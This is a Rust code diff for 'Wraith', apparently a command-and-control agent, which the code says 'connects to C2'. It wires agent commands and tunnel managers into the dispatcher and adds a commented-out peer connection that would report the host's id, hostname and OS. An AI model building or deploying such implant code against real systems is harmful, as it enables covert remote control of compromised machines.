@@ -1,3 +1,4 @@
+use crate::commands::agent::AgentCommands;
 use crate::commands::relay::RelayCommands;
 use crate::connection::Connection;
 use crate::connection::tcp::TcpConnection;
@@ -17,7 +18,7 @@ pub struct Wraith {
     tunnel_manager: Arc<TunnelManager>,
     agent_mode: bool,
     peer_listen_addr: Option<String>,
-    peer_connect_addr: Option<String>,
+    peer_connect_addr: Option<String>, // Peer to connect to (for agent mode)
 }
 
 impl Wraith {
@@ -25,12 +26,13 @@ impl Wraith {
         let relay_manager = Arc::new(Mutex::new(RelayManager::new()));
         let tunnel_manager = Arc::new(TunnelManager::new());
         let state = Arc::new(Mutex::new(WraithState::new_with_relay_manager(relay_manager.clone())));
-        let relay_commands = RelayCommands::new(relay_manager.clone());
+        let relay_commands = RelayCommands::new(relay_manager.clone(), tunnel_manager.clone());
+        let agent_commands = AgentCommands::new(tunnel_manager.clone());
 
         Self {
             connection: TcpConnection::new(host, port, is_server),
             state,
-            dispatcher: MessageDispatcher::new(relay_commands),
+            dispatcher: MessageDispatcher::new(relay_commands, agent_commands),
             tunnel_manager,
             agent_mode: false,
             peer_listen_addr: None,
@@ -43,12 +45,13 @@ impl Wraith {
         let relay_manager = Arc::new(Mutex::new(RelayManager::new()));
         let tunnel_manager = Arc::new(TunnelManager::new());
         let state = Arc::new(Mutex::new(WraithState::new_with_relay_manager(relay_manager.clone())));
-        let relay_commands = RelayCommands::new(relay_manager.clone());
+        let relay_commands = RelayCommands::new(relay_manager.clone(), tunnel_manager.clone());
+        let agent_commands = AgentCommands::new(tunnel_manager.clone());
 
         Self {
             connection: TcpConnection::new("0.0.0.0".to_string(), port, true),
             state,
-            dispatcher: MessageDispatcher::new(relay_commands),
+            dispatcher: MessageDispatcher::new(relay_commands, agent_commands),
             tunnel_manager,
             agent_mode: true,
             peer_listen_addr: Some(format!("{}:{}", host, port)),
@@ -57,20 +60,21 @@ impl Wraith {
     }
 
     /// Create Wraith in agent connect mode (connects to C2)
-    pub fn new_agent_connect(host: String, port: u16) -> Self {
+    pub fn new_agent_connect(host: String, port: u16, peer_addr: Option<String>) -> Self {
         let relay_manager = Arc::new(Mutex::new(RelayManager::new()));
         let tunnel_manager = Arc::new(TunnelManager::new());
         let state = Arc::new(Mutex::new(WraithState::new_with_relay_manager(relay_manager.clone())));
-        let relay_commands = RelayCommands::new(relay_manager.clone());
+        let relay_commands = RelayCommands::new(relay_manager.clone(), tunnel_manager.clone());
+        let agent_commands = AgentCommands::new(tunnel_manager.clone());
 
         Self {
             connection: TcpConnection::new(host.clone(), port, false),
             state,
-            dispatcher: MessageDispatcher::new(relay_commands),
+            dispatcher: MessageDispatcher::new(relay_commands, agent_commands),
             tunnel_manager,
             agent_mode: true,
             peer_listen_addr: None,
-            peer_connect_addr: Some(format!("{}:{}", host, port)),
+            peer_connect_addr: peer_addr,
         }
     }
 
@@ -176,10 +180,22 @@ impl Wraith {
             });
         }
 
-        // Also connect to peer if configured
-        if let Some(_addr) = &self.peer_connect_addr {
-            // TODO: Implement peer connection establishment
-        }
+        // Connect to peer if configured
+        // if let Some(addr) = &self.peer_connect_addr {
+        //     let state = self.state.lock().unwrap();
+        //     let wraith_id = state.wraith_id.clone();
+        //     let hostname = state.hostname.clone();
+        //     let os = state.os.clone();
+        //     drop(state);
+        //
+        //     let tunnel_manager = Arc::clone(&self.tunnel_manager);
+        //     let addr_clone = addr.clone();
+        //     tokio::spawn(async move {
+        //         if let Err(e) = tunnel_manager.connect_to_peer(addr_clone, wraith_id, hostname, os).await {
+        //             error!("Peer connection failed: {}", e);
+        //         }
+        //     });
+        // }
 
         // Main command loop
         loop {
